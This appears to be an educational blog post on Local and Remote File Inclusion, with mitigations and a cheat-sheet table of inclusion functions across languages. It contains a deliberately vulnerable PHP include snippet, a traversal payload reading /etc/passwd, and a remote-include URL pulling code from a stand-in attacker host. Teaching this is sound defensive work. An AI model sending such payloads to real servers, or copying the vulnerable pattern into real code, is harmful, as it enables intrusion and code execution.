---
title: File Inclusion
layout: post
date: 2025-05-05
description: "File Inclusion vulnerability"
permalink: /theory/misc/file-inclusion
---

## File Inclusion

File Inclusion vulnerabilities occur when an application includes files without proper validation or sanitization. This can lead to unauthorized access to sensitive files or even remote code execution.

### Local File Inclusion (LFI)

Local File Inclusion (LFI) allows an attacker to include files on the server's filesystem. This can lead to exposure of sensitive files, such as `/etc/passwd`, or even execution of arbitrary code if the included file is a script.

#### Example

```php
<?php
$file = $_GET['file'];
include($file);
?>
```
In this example, an attacker could manipulate the `file` parameter to include sensitive files:

```
http://example.com/vulnerable.php?file=../../../../etc/passwd
```
This would expose the contents of the `/etc/passwd` file.

#### Mitigation
1. **Input Validation**: Validate and sanitize user input to ensure only expected values are allowed.
2. **Use Whitelists**: Implement a whitelist of allowed files to include.
3. **Disable URL Include**: In PHP, disable `allow_url_include` in the `php.ini` configuration file to prevent remote file inclusion.
4. **Use Absolute Paths**: Use absolute paths for file inclusion to prevent directory traversal attacks.
5. **Error Handling**: Implement proper error handling to avoid revealing sensitive information in error messages.
6. **Web Application Firewall (WAF)**: Use a WAF to detect and block file inclusion attempts.

### Remote File Inclusion (RFI)
Remote File Inclusion (RFI) allows an attacker to include files from a remote server. This can lead to remote code execution if the included file is a script. RFI is less common today due to security measures in modern web servers, but it can still be a risk in poorly configured applications.

#### Example

```php
<?php
$file = $_GET['file'];
include($file);
?>
```
In this example, an attacker could manipulate the `file` parameter to include a remote file:

```
http://example.com/vulnerable.php?file=http://attacker.com/malicious.php
```
This would execute the code in `malicious.php` on the vulnerable server.
#### Mitigation
1. **Input Validation**: Validate and sanitize user input to ensure only expected values are allowed.
2. **Disable URL Include**: In PHP, disable `allow_url_include` in the `php.ini` configuration file to prevent remote file inclusion.
3. **Use Whitelists**: Implement a whitelist of allowed files to include.
4. **Use Absolute Paths**: Use absolute paths for file inclusion to prevent directory traversal attacks.
5. **Error Handling**: Implement proper error handling to avoid revealing sensitive information in error messages.
6. **Web Application Firewall (WAF)**: Use a WAF to detect and block file inclusion attempts.


## File Inclusion Cheat Sheet

### File Inclusion Functions

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |       Yes        |     Yes     |      Yes       |
| `require()`/`require_once()` |       Yes        |     Yes     |       No       |
| `file_get_contents()`        |       Yes        |     No      |      Yes       |
| `fopen()`/`file()`           |       Yes        |     No      |       No       |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |       Yes        |     No      |       No       |
| `fs.sendFile()`              |       Yes        |     No      |       No       |
| `res.render()`               |       Yes        |     Yes     |       No       |
| **Java**                     |                  |             |                |
| `include`                    |       Yes        |     No      |       No       |
| `import`                     |       Yes        |     Yes     |      Yes       |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |       Yes        |     No      |       No       |
| `@Html.RemotePartial()`      |       Yes        |     No      |      Yes       |
| `Response.WriteFile()`       |       Yes        |     No      |       No       |
| `include`                    |       Yes        |     Yes     |      Yes       |

## References
- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [HackTheBox](https://academy.hackthebox.com/module/details/23)

